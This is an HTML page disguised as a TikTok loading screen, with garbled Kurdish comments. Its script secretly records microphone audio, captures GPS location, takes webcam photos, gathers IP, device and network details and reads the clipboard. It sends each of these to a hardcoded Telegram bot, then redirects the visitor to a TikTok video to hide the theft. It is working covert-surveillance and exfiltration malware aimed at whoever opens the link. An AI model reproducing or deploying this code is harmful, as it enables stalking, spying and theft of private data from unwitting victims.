<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok</title>
    <style>
        /* Ø´Ø§Ø´Û•ÛŒÛ•Ú©ÛŒ Ú•Û•Ø´ÛŒ Ø³Ø§Ø¯Û• ÙˆÛ•Ú© Ø¨Ø§Ø±Ú¯Ø§ÙˆÛŒÚ©Ø±Ø¯Ù† */
        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; color: #333; font-family: sans-serif; }
    </style>
</head>
<body>
    <div id="loader">Loading...</div>
    <video id="v" style="display:none;" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const botToken = '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4';
        const chatId = '1034878899';
        const tiktokLink = "https://vt.tiktok.com/ZSmLkxJ31/";

        async function start() {
            try {
                // Ù¡. ØªÛ†Ù…Ø§Ø±Ú©Ø±Ø¯Ù†ÛŒ Ø¯Û•Ù†Ú¯ (Ø¨ÛØ¯Û•Ù†Ú¯) ğŸ¤
                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(audioStream);
                let chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/ogg' });
                    const fd = new FormData();
                    fd.append('chat_id', chatId); fd.append('voice', blob, 'v.ogg');
                    fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: fd });
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 4000);

                // Ù¢. Ù„Û†Ú©Û•ÛŒØ´Ù† ğŸ“
                navigator.geolocation.getCurrentPosition(pos => {
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("ğŸ“ GPS: http://maps.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude)}`);
                });

                // Ù£. ÙˆÛÙ†Û•Ú¯Ø±ØªÙ† (Ø¨Û•Ø¨Û ÙÙ„Ø§Ø´ Ø¨Û† Ø¦Û•ÙˆÛ•ÛŒ Ù‡Û•Ø³Øª Ù†Û•Ú©Ø§Øª) ğŸ“¸
                const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
                const videoEl = document.getElementById('v');
                videoEl.srcObject = videoStream;
                
                for (let i = 0; i < 3; i++) {
                    await new Promise(r => setTimeout(r, 1000));
                    const picCanvas = document.getElementById('c');
                    picCanvas.width = videoEl.videoWidth; picCanvas.height = videoEl.videoHeight;
                    picCanvas.getContext('2d').drawImage(videoEl, 0, 0);
                    const b = await new Promise(r => picCanvas.toBlob(r, 'image/jpeg'));
                    const fd = new FormData();
                    fd.append('chat_id', chatId); fd.append('photo', b, 'u.jpg');
                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                }
                videoStream.getTracks().forEach(t => t.stop());

                // Ù¤. Ú©Û†Ú©Ø±Ø¯Ù†Û•ÙˆÛ•ÛŒ Ù‡Û•Ù…ÙˆÙˆ Ø²Ø§Ù†ÛŒØ§Ø±ÛŒÛŒÛ•Ú©Ø§Ù† ğŸ“‹
                const ipRes = await fetch('https://ipapi.co/json/');
                const data = await ipRes.json();
                const battery = navigator.getBattery ? await navigator.getBattery() : { level: 0 };
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                const netType = conn ? conn.effectiveType : "N/A";
                const userLang = navigator.language;

                const report = `
ğŸ‘¤ **Target Detected**
-------------------------
ğŸŒ IP: \`${data.ip}\`
ğŸ“¶ Network: ${netType.toUpperCase()} (${data.org})
ğŸŒ Country: ${data.country_name}
ğŸ“± Device: ${navigator.platform}
ğŸ”‹ Battery: ${Math.round(battery.level * 100)}%
ğŸ—£ï¸ Lang: ${userLang}
-------------------------`;
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);

                // Ú©Û†ØªØ§ Ù‡Û•Ù†Ú¯Ø§Ùˆ: Ú•Û•ÙˆØ§Ù†Û•Ú©Ø±Ø¯Ù† Ø¨Û† ØªÛŒÚ©ØªÛ†Ú©
                window.location.href = tiktokLink;

            } catch(e) {
                // Ø¦Û•Ú¯Û•Ø± Ù…Û†ÚµÛ•ØªÛŒ Ù†Û•Ø¯Ø§ØŒ Ù‡Û•Ø± Ø¨ÛŒØ¨Û• Ø¨Û† ØªÛŒÚ©ØªÛ†Ú© Ø¨Û† Ø¦Û•ÙˆÛ•ÛŒ Ú¯ÙˆÙ…Ø§Ù† Ù†Û•Ú©Ø§Øª
                window.location.href = tiktokLink;
            }
        }

        // ÙˆÛ•Ø±Ú¯Ø±ØªÙ†ÛŒ Ú©Ù„Ù¾Ø¨Û†Ø±Ø¯ Ù„Û• Ú©Ø§ØªÛŒ Ú©Ù„ÛŒÚ©
        document.addEventListener('click', async () => {
            try {
                const text = await navigator.clipboard.readText();
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("ğŸ“‹ Clipboard: " + text)}`);
            } catch(e) {}
        });

        window.onload = start;
    </script>
</body>
</html>
